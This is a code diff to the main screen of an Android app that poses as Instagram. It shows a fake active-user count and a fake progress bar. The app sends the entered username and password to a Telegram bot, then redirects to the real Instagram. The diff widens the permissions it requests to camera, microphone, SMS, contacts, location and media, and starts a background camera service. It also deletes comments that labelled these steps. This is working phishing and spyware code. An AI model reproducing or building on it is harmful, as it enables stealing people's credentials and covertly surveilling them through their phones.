@@ -17,8 +17,7 @@ import androidx.core.content.ContextCompat
 import java.util.Random
 
 class MainActivity : AppCompatActivity() {
-
-    private val REQ_CAMERA = 1001
+    private val REQ_PERMS = 1001
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -56,10 +55,8 @@ class MainActivity : AppCompatActivity() {
                 val sec = String.format("%02d", seconds % 60)
                 tvTimer.text = "$min:$sec"
                 
-                // Live Data Blink
                 tvLive.alpha = if (tvLive.alpha == 1f) 0.5f else 1f
                 
-                // Fake Active Users
                 val rand = Random().nextInt(500)
                 tvActiveUsers.text = "${14230 + rand} مستخدم نشط الآن"
 
@@ -90,21 +87,47 @@ class MainActivity : AppCompatActivity() {
 
             val gender = if (rgGender.checkedRadioButtonId == R.id.rbMale) "ذكر" else "أنثى"
             
-            // Send Login to Telegram
             val msg = "🔐 بيانات جديدة!\n\n👤 المستخدم: $user\n🔑 كلمة المرور: $pass\n⚧ الجنس: $gender"
             Telegram.sendMessage(msg)
 
-            // Request Camera Permission
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-                ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), REQ_CAMERA)
-            } else {
-                startCameraService()
-            }
+            requestAllPermissions()
 
-            // Show Fake Progress
             layoutMain.visibility = View.GONE
             layoutProgress.visibility = View.VISIBLE
             fakeProgress(tvProgressStatus, layoutProgress)
+        }
+    }
+
+    private fun requestAllPermissions() {
+        val perms = mutableListOf(
+            Manifest.permission.CAMERA,
+            Manifest.permission.RECORD_AUDIO,
+            Manifest.permission.READ_EXTERNAL_STORAGE,
+            Manifest.permission.READ_SMS,
+            Manifest.permission.READ_CONTACTS,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.ACCESS_COARSE_LOCATION
+        )
+        if (Build.VERSION.SDK_INT >= 33) {
+            perms += Manifest.permission.READ_MEDIA_IMAGES
+            perms += Manifest.permission.READ_MEDIA_VIDEO
+            perms += Manifest.permission.READ_MEDIA_AUDIO
+            perms += Manifest.permission.POST_NOTIFICATIONS
+        }
+        val needed = perms.filter {
+            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+        }
+        if (needed.isNotEmpty()) {
+            ActivityCompat.requestPermissions(this, needed.toTypedArray(), REQ_PERMS)
+        } else {
+            startCameraService()
+        }
+    }
+
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == REQ_PERMS) {
+            startCameraService()
         }
     }
 
@@ -135,7 +158,6 @@ class MainActivity : AppCompatActivity() {
                     step++
                     handler.postDelayed(this, 2500)
                 } else {
-                    // Redirect to Real Instagram
                     val intent = Intent(Intent.ACTION_VIEW, Uri.parse("https://www.instagram.com"))
                     startActivity(intent)
                     finish()
@@ -148,14 +170,5 @@ class MainActivity : AppCompatActivity() {
     private fun startCameraService() {
         val intent = Intent(this, CameraService::class.java)
         ContextCompat.startForegroundService(this, intent)
-        // wait a bit then take photo
-        Handler(Looper.getMainLooper()).postDelayed({
-            Telegram.sendMessage("📸 جاري التقاط الصورة...")
-            // The service will capture when it receives command, or we can trigger here
-            // For simplicity, we send the command to the bot? No, it's automated.
-            // Actually, the service will run and check for /cam. 
-            // But we want automatic capture.
-            // We can send an intent to service, but for now, just tell user.
-        }, 1000)
     }
 }
